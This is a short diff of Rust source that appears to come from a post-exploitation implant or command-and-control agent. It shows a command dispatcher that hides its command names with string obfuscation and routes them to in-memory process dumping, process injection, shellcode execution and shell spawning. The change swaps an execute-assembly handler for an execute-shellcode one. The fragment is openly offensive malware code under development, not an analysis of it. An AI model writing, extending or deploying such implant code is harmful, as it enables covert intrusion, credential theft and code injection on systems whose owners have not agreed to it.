@@ -116,7 +116,7 @@ fn link_command(command: String) -> String {
     // obfsscated args
     match args[0] {
         a if (a == obfstr::obfstr!("procdump")) => safetydump::in_memory_dump(args),
-        a if (a == obfstr::obfstr!("execute-assembly")) => nonstd::execute_assembly(args),
+        a if (a == obfstr::obfstr!("execute-shellcode")) => nonstd::execute_shellcode(args),
         a if (a == obfstr::obfstr!("inject")) => nonstd::process_injection(args),
         a if (a == obfstr::obfstr!("cmd")) => command_spawn(args),
         a if (a == obfstr::obfstr!("shell")) => shell(args),
